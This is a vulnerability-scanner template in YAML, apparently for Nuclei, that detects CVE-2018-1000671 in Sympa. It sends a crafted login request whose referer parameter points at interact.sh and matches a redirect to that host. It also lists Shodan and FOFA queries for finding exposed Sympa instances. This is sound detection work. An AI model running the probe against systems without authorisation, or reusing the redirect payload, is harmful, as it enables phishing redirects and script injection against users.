http:
- matchers:
  - part: header
    regex:
    - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)interact\.sh\/?(\/|[^.].*)?$
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/sympa?referer=http://interact.sh&passwd=&previous_action=&action=login&action_login=&previous_list=&list=&email='
id: CVE-2018-1000671
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:sympa:sympa:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-1000671
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
    epss-percentile: 0.7484
    epss-score: 0.00883
  description: Sympa version 6.2.16 and later contains a URL Redirection to Untrusted
    Site vulnerability in the referer parameter of the wwsympa fcgi login action that
    can result in open redirection and reflected cross-site scripting via data URIs.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: body="sympa"
    max-request: 1
    product: sympa
    shodan-query: http.html:"sympa"
    vendor: sympa
    verified: true
  name: Sympa version =>6.2.16 - Cross-Site Scripting
  reference:
  - https://github.com/sympa-community/sympa/issues/268
  - https://vuldb.com/?id.123670
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1000671
  - https://lists.debian.org/debian-lts-announce/2018/09/msg00023.html
  - https://lists.debian.org/debian-lts-announce/2020/11/msg00015.html
  remediation: 'Upgrade to a patched version of Sympa (>=6.2.17) or apply the necessary
    security patches provided by the vendor.

    '
  severity: medium
  tags: cve,cve2018,redirect,sympa,debian,vuln
